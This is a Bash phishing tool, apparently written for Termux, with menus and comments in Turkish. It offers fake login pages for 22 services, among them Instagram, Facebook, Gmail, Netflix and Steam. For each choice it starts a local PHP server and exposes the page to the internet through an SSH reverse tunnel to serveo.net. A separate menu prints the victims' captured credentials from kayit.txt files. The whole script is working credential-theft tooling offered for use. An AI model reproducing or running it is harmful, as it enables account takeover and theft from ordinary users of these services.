#!/data/data/com.termux/bin/bash
#!/bin/bash
#Code : Yaman Efkar
#Youtube : Yaman Efkar
#İnstagram : @yamanefkarr
#Bu tool'un kullanımında meydana gelecek hiç bir şey sorumluluğumda değildir!Kişi yaptığı tüm işlerden kendisi sorumludur!
#TST
banner_menu(){
	bash start.sh
}
data(){
	clear
	echo -e "\033[31;40;1m

                \e[36m            DATA
         \e[32m******************************************

        \e[31m[\e[32m01\e[31m]\e[37mİnstagram Login       \e[31m[\e[32m17\e[31m]\e[37mSteam
        \e[31m[\e[32m02\e[31m]\e[37mİnstagram Panel       \e[31m[\e[32m18\e[31m]\e[37mLol
        \e[31m[\e[32m03\e[31m]\e[37mFacebook Login        \e[31m[\e[32m19\e[31m]\e[37mPubg
        \e[31m[\e[32m04\e[31m]\e[37mFacebook Panel        \e[31m[\e[32m20\e[31m]\e[37mWolfteam
        \e[31m[\e[32m05\e[31m]\e[37mTwitter Login         \e[31m[\e[32m21\e[31m]\e[37mZula
        \e[31m[\e[32m06\e[31m]\e[37mTwitter Panel         \e[31m[\e[32m22\e[31m]\e[37mLegend Online
        \e[31m[\e[32m07\e[31m]\e[37mYoutube
        \e[31m[\e[32m08\e[31m]\e[37mWhatsapp
        \e[31m[\e[32m09\e[31m]\e[37mSpofity
        \e[31m[\e[32m10\e[31m]\e[37mNetflix
        \e[31m[\e[32m11\e[31m]\e[37mBlu Tv
        \e[31m[\e[32m12\e[31m]\e[37mTikTok
        \e[31m[\e[32m13\e[31m]\e[37mTwitch
        \e[31m[\e[32m14\e[31m]\e[37mGmail
        \e[31m[\e[32m15\e[31m]\e[37mHotmail
        \e[31m[\e[32m16\e[31m]\e[37mYandex


        \e[31m[\e[32m99\e[31m]\e[37mMENU
                        "

}


menu(){

clear
	echo -e '\e[37m
	\t      Code: Yaman Efkar\033[31;40;1m'
echo -e "\033[1;33m╔✁✃✁✃✁✃✁✃✁✁✃✁✃✁✃✁✃✃✁✃✁✃✁✃✁✃✁✃✁✁✁✃✁✃✁✃✃✁✃✁✁✃✁✃✁✃✁✃✁✁✃✁✃✁✃✁✃✁╗"
echo -e "\033[1;31m✂  \e[31m[\e[32m01\e[31m]\e[37mİnstagram Login			\e[31m[\e[32m02\e[31m]\e[37mİnstagram Panel"
echo -e "\033[1;33m✂  \e[31m[\e[32m03\e[31m]\e[37mFacebook Login			\e[31m[\e[32m04\e[31m]\e[37mFacebook Panel"
echo -e "\033[1;31m✂  \e[31m[\e[32m05\e[31m]\e[37mTwitter Login			\e[31m[\e[32m06\e[31m]\e[37mTwitter Panel  "
echo -e "\033[1;33m✂  \e[31m[\e[32m07\e[31m]\e[37mYoutube			        \e[31m[\e[32m08\e[31m]\e[37mWhatsapp"
echo -e "\033[1;31m✂  \e[31m[\e[32m09\e[31m]\e[37mSpofity			        \e[31m[\e[32m10\e[31m]\e[37mNetflix"
echo -e "\033[1;33m✂  \e[31m[\e[32m11\e[31m]\e[37mBlu Tv			        \e[31m[\e[32m12\e[31m]\e[37mTikTok"
echo -e "\033[1;31m✂  \e[31m[\e[32m13\e[31m]\e[37mTwitch			        \e[31m[\e[32m14\e[31m]\e[37mGmail"
echo -e "\033[1;33m✂  \e[31m[\e[32m15\e[31m]\e[37mHotmail			        \e[31m[\e[32m16\e[31m]\e[37mYandex"
echo -e "\033[1;31m✂  \e[31m[\e[32m17\e[31m]\e[37mSteam			        \e[31m[\e[32m18\e[31m]\e[37mLol"
echo -e "\033[1;33m✂  \e[31m[\e[32m19\e[31m]\e[37mPubg 			        \e[31m[\e[32m20\e[31m]\e[37mWolfteam"
echo -e "\033[1;31m✂  \e[31m[\e[32m21\e[31m]\e[37mZula 			        \e[31m[\e[32m22\e[31m]\e[37mLegend Online"
echo -e "\033[1;33m༺༻✦༺༻✧༺༻✦༺༻✦༺༻✧༺༻✦༺༻✦༺༻✧༺༻✦༺༻✧༺༻✦༺༻✧༺༻✦༺༻✧༺༻✦༺༻✧༺༻✦༺༻✧༺༻✦༺༻✧"

echo ""
echo -e "\033[1;33m✂  \e[31m[\e[32m00\e[31m]\e[37mVeriler (Data)           \e[31m[\e[32m99\e[31m]\e[37mÇıkış(Exit)"
echo ""
echo ""
}

menu

randomport=$[ $RANDOM % 7000 +1000 ]
randomhosting="yamanefkar"$[ $RANDOM % 7000 + $randomport ]$RANDOM

read -p $'\e[31m➤\e[32m➤\e[31m➤\e[37m  İşlem Numarası : ' islem_numarasi


	if [[ $islem_numarasi == 01 ||  $islem_numarasi == 1  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/instagram-login/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

    elif [[ $islem_numarasi == 02 ||  $islem_numarasi == 2  ]]; then                    
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/instagram-panel/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 03 ||  $islem_numarasi == 3  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/facebook-login/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

    elif [[ $islem_numarasi == 04 ||  $islem_numarasi == 4  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/facebook-panel/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net    	

	elif [[ $islem_numarasi == 05 ||  $islem_numarasi == 5  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/twitter-login/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 06 ||  $islem_numarasi == 6  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/twitter-panel/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 07 ||  $islem_numarasi == 7  ]]; then	
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/youtube/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 08 ||  $islem_numarasi == 8  ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/whatsapp/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 09 ||  $islem_numarasi == 9  ]]; then                    
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/spotify/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net


	elif [[ $islem_numarasi == 10 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/netflix/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 11 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/blutv/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 12 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/tiktok/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 13 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/twitch/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 14 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/gmail/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net

	elif [[ $islem_numarasi == 15 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/hotmail/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 16 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/yandex/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 17 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/steam/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 18 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/lol/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 19 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/pubg/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 20 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/wolfteam/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 21 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/zula/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net
	elif [[ $islem_numarasi == 22 ]]; then
                        echo -e '\033[31;32;1m Lütfen bekleyiniz...'
                        cd Sites/legend/ &&
                        php -S 127.0.0.1:$randomport > /dev/null 2>&1 &
                        sleep 2
                        ssh -R 80:localhost:$randomport $randomhosting@serveo.net


	elif [[ $islem_numarasi == 00 ||  $islem_numarasi == 0  ]]; then                        
		data
		read -p $'\e[31m[\e[32m!\e[31m]\e[37mİşlem Numarası : ' islem_code



if [[ $islem_code == 1 || $islem_code == 01 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/instagram-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu


elif [[ $islem_code == 2 || $islem_code == 02 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/instagram-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu


elif [[ $islem_code == 3 || $islem_code == 03 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/facebook-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 4 || $islem_code == 04 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/facebook-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 5 || $islem_code == 05 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/twitter-login/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 6 || $islem_code == 06 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/twitter-panel/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 7 || $islem_code == 07 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/youtube/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 8 || $islem_code == 08 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/whatsapp/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 9 || $islem_code == 09 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/spofity/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 10 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/netflix/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 11 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/blutv/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 12 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/tiktok/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 13 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/twitch/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 14 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/gmail/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 15 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/hotmail/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 16 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/yandex/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 17 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/steam/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 18 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/lol/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 19 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/pubg/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 20 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/wolfteam/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 21 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/zula/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 22 ]]; then
        echo ""
        echo -e "\e[33mVeriler Geliyor...."
        sleep 2
        echo -e "\e[37m"
        cat Sites/legend/kayit.txt
        read -p $'\e[31m[\e[32m!\e[31m]\e[37mAna Menüye Dönmek için Entere basınız....' anasfa
        banner_menu

elif [[ $islem_code == 9 || $islem_code == 99 ]]; then
                banner_menu

else
                echo -e '\033[31;40;1mİslem Numaranızı Kontrol Ediniz!'
                sleep 1
                banner_menu
fi

	else
                                echo -e '\033[31;40;1m İslem Numaranızı Kontrol Ediniz!'
                                
 	fi
